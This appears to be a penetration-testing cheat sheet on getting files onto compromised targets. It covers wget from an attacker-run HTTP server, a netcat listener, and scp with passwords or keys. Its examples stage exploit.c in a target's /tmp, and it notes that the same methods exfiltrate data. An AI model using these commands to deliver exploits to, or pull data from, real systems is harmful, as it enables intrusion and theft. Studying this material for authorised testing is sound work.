# Getting Files Onto Targets

Often you may want to put a file onto a target, this can be useful to move exploits onto the target amongst other things. Most of these techniques can be used in reverse to exfiltrate data as well

## Using wget

A common method uses wget to pull the files from a web server

    wget [URL] -O [Save Location]

### Params

    [URL]: The URL of the file to download, could also be an IP address
    [Save Location]: Where to save the file, if only a directory is provided, the filename is taken from the url

### Examples

    wget http://192.164.56.101/file.txt -O /tmp

    wget http://target-domain.com/123.c -O /tmp/exploit.c

### Servers Expose Files 

When you want to expose a file from your machine to wget you may want to enable a HTTP server on your machine to expose the files

#### Apache Server

Kali comes with an apache2 server pre-installed, it can be activated using the following command

    apache2ctl start

then files within `/var/www/html` can be accessed on port `80` of your IP address

#### Python HTTP Server

Python can also provide a http server

    python -m SimpleHTTPServer [Port]

This will expose the directory the command is run within and any sub directories as a web server

##### Params

    [Port]: The port to expose the server on

##### Examples 

    python -m SimpleHTTPServer 8080

    python -m SimpleHTTPServer 1234

## Using Netcat

An alternative option is to use netcat to transfer the file as raw data 

### Reverse Connection

This uses a similar principle to a reverse shell, firstly you run open a listener on your machine, feeding in the file you wish to transfer, then on the target you connect back to the listener, sending the output to a file

#### Setting The Listener

    nc -nvlp [Port] < [File]

##### Params

    [Port]: The port to listen for a connection on 
    [File]: The file to send to the target

##### Examples 

    nc -nvlp 4444 < exploit.c

#### Triggering The Transfer

    nc [IP] [Port] > [File]

##### Params

    [IP]: The IP address which has a listener set
    [Port]: The port the listener is looking at
    [File]: The file to save

##### Examples

    nc 192.168.56.101 4444 > boost.c

## Using SCP

If you have ssh credentials for the target, and an open ssh port you can use scp to transfer files

### Using Username:Password Combo

When using this command you will prompted for the accounts password 

    scp -P [Port] [File] [Username]@[IP]:[Save Location]

#### Params

    [Port] (Optional): Part of the -P option, specifying the ssh port, can be left out if on default port
    [File]: The file to transfer to the target
    [Username]: The ssh username to login with
    [IP]: The IP address of the target
    [Save Location]: Where to save the file, if only a directory is provided then it uses the name from your local machine

#### Examples 

    scp -P 8888 exploit.c max@192.168.56.102:/tmp

    scp exploit.c max@192.168.56.102:/tmp/outfile.c

### Using SSH Key

    scp -P [Port] -i [Key] [File] [Username]@[IP]:[Save Location]

#### Params

    [Port] (Optional): Part of the -P option, specifying the ssh port, can be left out if on default port
    [Key]: File containing SSH key used to authenticate as user
    [File]: The file to transfer to the target
    [Username]: The ssh username to login with
    [IP]: The IP address of the target
    [Save Location]: Where to save the file, if only a directory is provided then it uses the name from your local machine

#### Examples 

    scp -P 8888 -i ./key.txt exploit.c max@192.168.56.102:/tmp

    scp exploit.c -i ./key.txt max@192.168.56.102:/tmp/outfile.c
